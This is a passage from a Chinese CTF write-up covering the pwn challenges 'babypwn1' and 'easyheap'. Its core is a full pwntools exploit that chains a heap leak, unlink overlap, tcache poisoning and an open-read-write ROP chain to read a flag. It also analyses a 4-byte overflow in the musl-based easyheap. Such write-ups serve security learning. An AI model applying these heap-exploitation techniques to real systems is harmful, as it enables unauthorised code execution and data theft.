<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  a1 ^= (<span class="number">32</span> * a1) ^ ((a1 ^ (<span class="number">32</span> * a1)) &gt;&gt; <span class="number">17</span>) ^ (((<span class="number">32</span> * a1) ^ a1 ^ ((a1 ^ (<span class="number">32</span> * a1)) &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">13</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>, a1);</span><br></pre></td></tr></table></figure>
<p>直接使用 z3 求解，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">target</span>):</span></span><br><span class="line">    a1 = BitVec(<span class="string">&quot;a1&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    x = Solver()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        a1 ^= (<span class="number">32</span> * a1) ^ LShR((a1 ^ (<span class="number">32</span> * a1)),<span class="number">17</span>) ^ (((<span class="number">32</span> * a1) ^ a1 ^ LShR((a1 ^ (<span class="number">32</span> * a1)),<span class="number">17</span>)) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">    x.add(target == a1)</span><br><span class="line">    <span class="keyword">if</span>(x.check()==sat):</span><br><span class="line">        model = <span class="built_in">str</span>(x.model())</span><br><span class="line">        <span class="built_in">print</span>(model)</span><br><span class="line">        pos, val = model.split(<span class="string">&#x27;=&#x27;</span>)[:<span class="number">2</span>]</span><br><span class="line">        re = <span class="built_in">eval</span>(val[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(re))</span><br><span class="line">    <span class="keyword">return</span> re</span><br></pre></td></tr></table></figure>
<ul>
<li>这里弄了好久，最后发现 z3 不能直接左移，要用对应的函数 LShR</li>
</ul>
<p>泄露 heap_base 很容易就能打 unlink 实现堆重叠，程序开了沙盒，需要使用堆上 ORW 的技术：</p>
<ul>
<li>限制了 size 大小（难以打 largebin attack），但通过劫持 tcache 可以打 IO</li>
<li>也可以通过 TLS 泄露栈地址，然后劫持 tcache 打栈</li>
</ul>
<p>这里我选择了后者（一般来说，程序如果限制 size 为 unsorted chunk 则选择前者，限制 size 为 tcache 就选择后者）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./babypwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0xFCB)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span> <span class="comment"># 17</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">target</span>):</span></span><br><span class="line">    a1 = BitVec(<span class="string">&quot;a1&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    x = Solver()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        a1 ^= (<span class="number">32</span> * a1) ^ LShR((a1 ^ (<span class="number">32</span> * a1)),<span class="number">17</span>) ^ (((<span class="number">32</span> * a1) ^ a1 ^ LShR((a1 ^ (<span class="number">32</span> * a1)),<span class="number">17</span>)) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">    x.add(target == a1)</span><br><span class="line">    <span class="keyword">if</span>(x.check()==sat):</span><br><span class="line">        model = <span class="built_in">str</span>(x.model())</span><br><span class="line">        <span class="built_in">print</span>(model)</span><br><span class="line">        pos, val = model.split(<span class="string">&#x27;=&#x27;</span>)[:<span class="number">2</span>]</span><br><span class="line">        re = <span class="built_in">eval</span>(val[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(re))</span><br><span class="line">    <span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr1 = decode(leakaddr)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr2 = decode(leakaddr)</span><br><span class="line"></span><br><span class="line">leakaddr = leakaddr1 + leakaddr2 * <span class="number">0x100000000</span></span><br><span class="line">heap_base = leakaddr - <span class="number">0x670</span></span><br><span class="line">success(<span class="string">&quot;leakaddr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakaddr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#0</span></span><br><span class="line">heap_addr = heap_base + <span class="number">0xf60</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x541</span>) </span><br><span class="line">payload += p64(heap_addr+<span class="number">0x30</span>)+p64(heap_addr+<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(heap_addr+<span class="number">0x10</span>)+p64(heap_addr+<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x108</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>+p64(<span class="number">0x540</span>)</span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)</span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i+<span class="number">7</span>)</span><br><span class="line">    </span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr1 = decode(leakaddr)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr2 = decode(leakaddr)</span><br><span class="line"></span><br><span class="line">leakaddr = leakaddr1 + leakaddr2 * <span class="number">0x100000000</span></span><br><span class="line">libc_base = leakaddr - <span class="number">0x3ec120</span></span><br><span class="line">success(<span class="string">&quot;leakaddr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakaddr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">set_context = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">61</span></span><br><span class="line">stack_libc = libc_base + <span class="number">0x5d1a40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    dele(<span class="number">4</span>-i)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0xb8</span>*<span class="string">&quot;a&quot;</span>+p64(<span class="number">0x111</span>)+p64(stack_libc)+p64(heap_base+<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr1 = decode(leakaddr)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr2 = decode(leakaddr)</span><br><span class="line"></span><br><span class="line">leakaddr = leakaddr1 + leakaddr2 * <span class="number">0x100000000</span></span><br><span class="line">stack_base = leakaddr - <span class="number">0x1fc90</span></span><br><span class="line">success(<span class="string">&quot;leakaddr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakaddr))</span><br><span class="line">success(<span class="string">&quot;stack_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc_base+<span class="number">0x000000000001b500</span></span><br><span class="line">pop_rdi_ret = libc_base+<span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc_base+<span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_ret = libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">syscall_ret = libc_base+<span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">payload = <span class="string">&quot;b&quot;</span>*<span class="number">0x1d8</span>+p64(<span class="number">0x100</span>)+p64(stack_base+<span class="number">0x1fc48</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(bss_addr,0)[4]</span></span><br><span class="line">payload =  <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(stack_base+<span class="number">0x1fd20</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(4,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(stack_base+<span class="number">0x1fd20</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(stack_base+<span class="number">0x1fd20</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += <span class="string">&quot;./flag\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">easyheap: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so<span class="number">.1</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p>程序给了一个 libc.so，一番查找后发现这是一个 musl libc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn ./libc.<span class="function">so        </span></span><br><span class="line"><span class="function">musl <span class="title">libc</span> <span class="params">(x86_64)</span></span></span><br><span class="line"><span class="function">Version 1.2.2</span></span><br><span class="line"><span class="function">Dynamic Program Loader</span></span><br><span class="line"><span class="function">Usage: ./libc.so [options] [--] pathname [args]</span></span><br></pre></td></tr></table></figure>
<ul>
<li>PS：musl 只有一个 libc，即作为 libc 也是 ld</li>
</ul>
<p>对于 musl libc，patchelf 是无效的，需要将题目提供的 libc.so 复制到对应的目录：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp libc.so /usr/lib/x86_64-linux-musl/libc.so</span><br></pre></td></tr></table></figure>
<p><strong>程序分析</strong></p>
<p>想要开启程序核心功能必须先逆向解密：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  data = *codep;</span><br><span class="line">  keyp += <span class="number">2</span>;</span><br><span class="line">  ++codep;</span><br><span class="line">  <span class="built_in">sprintf</span>(keyp, <span class="string">&quot;%02x&quot;</span>, (<span class="keyword">unsigned</span> __int8)data ^ <span class="number">0x23</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( keyp != (<span class="keyword">char</span> *)&amp;zero );</span><br><span class="line"><span class="keyword">if</span> ( key[<span class="number">0</span>] ^ <span class="number">0x3036323130313437</span>LL | key[<span class="number">1</span>] ^ <span class="number">0x6337303165363331</span>LL</span><br><span class="line">  || key[<span class="number">2</span>] ^ <span class="number">0x3237633763343735</span>LL | key[<span class="number">3</span>] ^ <span class="number">0x3231313131363437</span>LL )</span><br></pre></td></tr></table></figure>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">key=[<span class="number">0x3036323130313437</span>,<span class="number">0x6337303165363331</span>,<span class="number">0x3237633763343735</span>,<span class="number">0x3231313131363437</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    num = i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        key = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            key += <span class="built_in">chr</span>((num % <span class="number">0x100</span>))</span><br><span class="line">            num = num // <span class="number">0x100</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+key)^<span class="number">0x23</span>),end=<span class="string">&quot;&quot;</span>) <span class="comment"># W31C0M3_to_QWB21</span></span><br></pre></td></tr></table></figure>
<p>函数 Prepare 提供了4种核心功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000204300</span> <span class="number">90</span> <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">14</span>+funcs dq offset add                     ; DATA XREF: Prepare+<span class="number">230</span>↑o</span><br><span class="line">.data:<span class="number">0000000000204300</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">70</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span>+                                        ; Prepare+<span class="number">23</span>C↑r</span><br><span class="line">.data:<span class="number">0000000000204300</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">1</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+dq offset dele</span><br><span class="line">.data:<span class="number">0000000000204300</span> <span class="number">00</span> <span class="number">00</span>                         dq offset show</span><br><span class="line">.data:<span class="number">0000000000204300</span>                               dq offset edit</span><br></pre></td></tr></table></figure>
<ul>
<li>add：输入 size 作为 num 的个数，然后输入 size 个 num，申请 <code>(num+1)*4</code> 大小的 chunk，以4字节为单位将数据写入 chunk，最后调用 <code>get_op</code> 依次遍历这些数字，并依次随机选择四则运算中的一个运算操作符进行运算，将运算结果填充到最后一个数字槽中</li>
<li>edit：重新输入 size 个 num，调用 <code>get_op</code> 进行计算，并将结果写回（位置错误）</li>
</ul>
<p>函数 Challenge 需要对最后一个随机生成的数字进行猜测，程序对每一次猜测提供了两次 Silver Finger 和全局两次 Golden Finger 的功能：</p>
<ul>
<li>Silver Finger 只会允许跳过当前级别对数字的猜测</li>
<li>Golden Finger 会根据用户输入的数字的数量，得到最终正确答案的数字</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>函数 add 执行结果回写的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = &amp;node-&gt;chunk[size + <span class="number">1</span> - <span class="number">1</span>];</span><br><span class="line">*data = get_op(chunk, size);</span><br></pre></td></tr></table></figure>
<p>函数 edit 执行结果回写的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sizea = size + <span class="number">1</span>;</span><br><span class="line">chunk[sizea] = get_op(chunk, sizea);</span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现，函数 edit 有明显的4字节溢出</li>
</ul>
<p>打印数据时，会输出38字节，但是 <code>info.header-&gt;name</code> 的值可能小于38字节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;#   Name: %-38s #\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;info.header-&gt;name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;#   Level: %-38d#\n&quot;</span>, **(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)((<span class="keyword">char</span> *)&amp;info.header-&gt;level + info.header-&gt;size));</span><br></pre></td></tr></table></figure>
